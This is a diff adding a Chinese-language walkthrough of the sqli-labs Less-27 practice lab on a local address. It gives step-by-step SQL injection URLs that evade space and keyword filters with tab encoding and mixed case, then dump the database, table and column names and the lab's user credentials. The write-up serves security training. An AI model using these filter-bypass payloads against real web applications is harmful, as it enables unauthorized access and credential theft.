@@ -1,0 +1,40 @@
+http://10.0.2.15/sqli/Less-27/?id=0\
+报错：' '0\' LIMIT 0,1 '
+
+由此推测sql：select 字段名 from 字段值 where id = '输入的id' limit 0,1;
+http://10.0.2.15/sqli/Less-27/?id=0' --+
+根据下方的蓝字显示知，将--+过滤掉了
+http://10.0.2.15/sqli/Less-27/?id=0' or '1' = '1
+正常显示用户名和密码，说明对sql的推测是正确的，且根据下方的蓝字，可以看出代码过滤空格
+于是使用updatexml和()进行绕过过滤(或者使用%09来代替空格（这里有个很奇怪的事，在Less-26中，用%09代替空格会被过滤，但在本题中用%09代替空格不会出现这种问题
+在此使用%09代替空格
+
+1.字段数
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09select%091,2,3||'1'='1
+但发现select会被过滤掉
+绕过过滤黑名单的方法一般有三种：利用Mysql大小写不敏感进行绕过、双写绕过、利用16进制编码和URL编码绕过
+本题使用利用Mysql大小写不敏感进行绕过
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09selecT%091,2,3||'1'='1
+正常显示
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09selecT%091,2,3,4||'1'='1
+报错，说明字段数为3
+
+2.数据库名
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09selecT%091,database(),3||'1'='1
+数据库名：security
+
+3.表名
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09selecT%091,(selecT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema='security'),3||'1'='1
+表名：users,uagents,emails,referers
+
+4.字段名
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09selecT%091,(selecT%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_name='users'),3||'1'='1
+
+5.字段名：
+id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+
+6.字段值
+http://10.0.2.15/sqli/Less-27/?id=0'%09uniOn%09selecT%091,(selecT%09group_concat(username,0x3a,password)%09from%09users),3||'1'='1
+
+7.字段值：
+Dumb:1,Angelina:1,Dummy:1,secure:1,stupid:1,superman:1,batman:1,admin:123,admin1:1,admin2:1,admin3:1,dhakkan:1,admin4:1
